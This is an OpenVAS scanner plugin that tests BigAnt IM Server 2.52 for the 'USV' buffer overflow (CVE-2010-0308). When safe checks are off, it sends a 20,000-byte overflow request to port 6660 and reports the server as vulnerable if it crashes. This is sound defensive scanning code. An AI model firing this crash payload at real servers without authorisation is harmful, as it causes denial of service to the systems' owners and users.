###############################################################################
# OpenVAS Vulnerability Test
# $Id: BigAnt_37522.nasl 8287 2018-01-04 07:28:11Z teissa $
#
# BigAnt IM Server 'USV' Request Buffer Overflow Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "BigAnt IM Server is prone to a remote buffer-overflow vulnerability
because it fails to perform adequate boundary checks on user-
supplied input.

An attacker can exploit this issue to execute arbitrary code with the
privileges of the user running the server. Failed exploit attempts
will result in a denial-of-service condition.

BigAnt IM Server 2.52 is vulnerable; other versions may also be
affected.";


if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.100413");
 script_version("$Revision: 8287 $");
 script_tag(name:"last_modification", value:"$Date: 2018-01-04 08:28:11 +0100 (Thu, 04 Jan 2018) $");
 script_tag(name:"creation_date", value:"2010-01-04 18:09:12 +0100 (Mon, 04 Jan 2010)");
 script_bugtraq_id(37520);
 script_tag(name:"cvss_base", value:"4.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:N/I:N/A:P");
 script_cve_id("CVE-2010-0308");

 script_name("BigAnt IM Server 'USV' Request Buffer Overflow Vulnerability");


 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_DENIAL);
 script_family("Buffer overflow");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("BigAnt_detect.nasl");
 script_require_ports("Services/BigAnt", 6660);
 script_tag(name : "summary" , value : tag_summary);
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/37520");
 script_xref(name : "URL" , value : "http://www.bigantsoft.com");
 exit(0);
}

include("http_func.inc");

if(safe_checks())exit(0);

port = get_kb_item("Services/BigAnt");
if(!port)exit(0);

if(!get_port_state(port))exit(0);
if(http_is_dead(port:port))exit(0);

payload = crap(data:raw_string(0x90), length: 20000);

soc = open_sock_tcp(port);
if(!soc)exit(0);

req = string("USV ", payload, "\r\n\r\n");

send(socket:soc, data:req);
sleep(5);
if(http_is_dead(port: port)) {
  security_message(port:port);
  exit(0);
}

exit(0);
